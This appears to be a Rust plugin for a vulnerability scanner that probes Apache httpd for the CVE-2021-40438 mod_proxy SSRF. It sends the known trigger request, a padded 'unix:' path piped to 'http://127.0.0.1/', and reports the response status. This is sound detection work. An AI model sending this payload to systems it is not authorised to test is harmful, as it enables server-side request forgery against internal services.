/* http-check-cve2021-40438-4 - Apache httpd mod_proxy SSRF * (CVE detection probe; benign request, verify out-of-band). * Use only on networks you own or have permission t */
#![allow(dead_code)]
mod arsenal;
use arsenal::*;

#[no_mangle]
pub extern "C" fn almap_script_run(ctx: *mut AlScriptContext) -> i32 {
let port = unsafe { (*ctx).port };
let mut resp = String::new();
resp = match http_request(ctx, "GET", "/?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|http://127.0.0.1/", None, "", "", None, 8192) {
    Some(r) if !r.is_empty() => r,
    _ => { set_out(ctx, "http-check-cve2021-40438-4: no HTTP response"); return 0; }
};
set_out(ctx, &format!("probe sent: GET /?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [{}] (CVE2021-40438; verify out-of-band)", http_status(&resp)));
0
}
